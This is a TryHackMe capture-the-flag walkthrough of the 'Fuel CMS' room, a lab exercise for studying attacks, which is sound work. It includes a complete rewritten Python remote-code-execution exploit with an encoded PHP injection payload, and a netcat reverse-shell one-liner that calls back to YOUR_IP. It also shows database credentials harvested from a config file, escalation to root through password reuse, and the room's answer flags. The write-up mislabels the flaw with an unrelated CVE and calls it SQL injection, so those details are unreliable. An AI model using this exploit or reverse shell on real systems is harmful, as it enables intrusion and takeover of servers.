# Fuel CMS — TryHackMe CTF Writeup

**Room:** Fuel CMS  
**Designed by:** DarkStar7471 | **Built by:** Paradox  
**Difficulty:** Easy  
**Author:** Parth (Quantum University Roorkee, B.Tech CSE, Batch 2024)

---

## Flags

| Flag | Value |
|------|-------|
| user.txt | `6470e394cbf6dab6a91682cc8585059b` |
| root.txt | `b9bbcb33e11b80be759c4e844862482d` |

---

## Step 1 — Reconnaissance (Nmap)

Start with a full port scan:

```bash
sudo nmap -sC -sV -Pn -A 10.49.154.172
```

**Results:**

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

Only port 80 is open running Apache 2.4.18 on Ubuntu.

---

## Step 2 — Web Enumeration

### robots.txt

Visiting `http://10.49.154.172/robots.txt` reveals:

```
User-agent: *
Disallow: /fuel/
```

This hints at a `/fuel/` admin panel.

### Page Source

Checking the page source at `http://10.49.154.172` reveals:

- **CMS:** FUEL CMS Version 1.4
- **Admin panel:** `http://10.49.154.172/fuel`
- **Default credentials:** `admin:admin`

---

## Step 3 — Identifying the Vulnerability

FUEL CMS 1.4 is vulnerable to **Remote Code Execution (RCE)**.

**CVE:** CVE-2019-6340  
**Type:** SQL Injection leading to RCE via the `pages` filter parameter

Search for the exploit:

```bash
searchsploit fuel cms
searchsploit -m php/webapps/47138.py
```

---

## Step 4 — Fixing the Exploit (Python 2 → Python 3)

The downloaded exploit `47138.py` is written in Python 2 and throws errors on Python 3. Rewrite it:

```bash
cat > 47138.py << 'EOF'
import requests
import urllib.parse

url = "http://10.49.154.172"

def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
    xxxx = input('cmd:')
    xxxx_encoded = urllib.parse.quote(xxxx)
    burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+xxxx_encoded+"%27%29%2b%27"
    r = requests.get(burp0_url)
    html = "<!DOCTYPE html>"
    begin = r.text[0:20]
    dup = find_nth_overlapping(r.text, begin, 2)
    print(r.text[0:dup])
EOF
```

**Changes made from original:**
- `raw_input` → `input`
- `urllib.quote` → `urllib.parse.quote`
- `print r.text` → `print(r.text)`
- Removed Burp proxy config

---

## Step 5 — Running the Exploit (RCE)

```bash
python3 47138.py
```

Test RCE:

```
cmd:id
system uid=33(www-data) gid=33(www-data) groups=33(www-data)

cmd:ls
system README.md assets composer.json contributing.md fuel index.php robots.txt

cmd:ls /home/
system www-data
```

RCE confirmed as `www-data`.

---

## Step 6 — Capturing User Flag

```
cmd:cat /home/www-data/flag.txt
system 6470e394cbf6dab6a91682cc8585059b
```

**user.txt:** `6470e394cbf6dab6a91682cc8585059b`

---

## Step 7 — Credential Harvesting

Read the database config file:

```
cmd:cat /var/www/html/fuel/application/config/database.php
```

Found credentials:

```php
'username' => 'root',
'password' => 'mememe',
'database' => 'fuel_schema',
```

**Credentials:** `root:mememe`

---

## Step 8 — Reverse Shell

Start a Netcat listener on Kali:

```bash
nc -lvnp 4444
```

Trigger the reverse shell via the pseudo-shell (note: use `cmd:` prompt directly without `sh -c` wrapper since semicolons break PHP parsing):

```
cmd:rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f
```

Connection received:

```
connect to [YOUR_IP] from (UNKNOWN) [10.49.154.172] 56260
/bin/sh: 0: can't access tty; job control turned off
$
```

---

## Step 9 — TTY Upgrade

The basic shell won't allow `su`. Upgrade it with Python:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Now you have a proper bash shell as `www-data`.

---

## Step 10 — Privilege Escalation to Root

Use the harvested password to switch to root:

```bash
su root
# Password: mememe
```

Success! Now read the root flag:

```bash
cat /root/root.txt
```

**root.txt:** `b9bbcb33e11b80be759c4e844862482d`

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Nmap scan | Port 80 open, Apache 2.4.18 |
| 2 | Web enumeration | FUEL CMS 1.4, `/fuel/` admin panel |
| 3 | CVE-2019-6340 | RCE via pages filter SQLi |
| 4 | Fix exploit | Converted Python 2 → Python 3 |
| 5 | RCE | Executing commands as www-data |
| 6 | User flag | Found at `/home/www-data/flag.txt` |
| 7 | Config leak | `root:mememe` from database.php |
| 8 | Reverse shell | Stable shell via Netcat |
| 9 | TTY upgrade | `python3 pty.spawn` |
| 10 | Privesc | Password reuse → root via `su` |

---

## Key Takeaways

- Always check page source and `robots.txt` early
- Outdated CMS versions have public CVEs — always check searchsploit
- Config files often contain reused credentials
- Password reuse from DB configs to system accounts is extremely common
- Always upgrade your shell with `python3 pty.spawn` before running `su`

---

*Writeup by Parth | Quantum University Roorkee | B.Tech CSE 2024-2028*
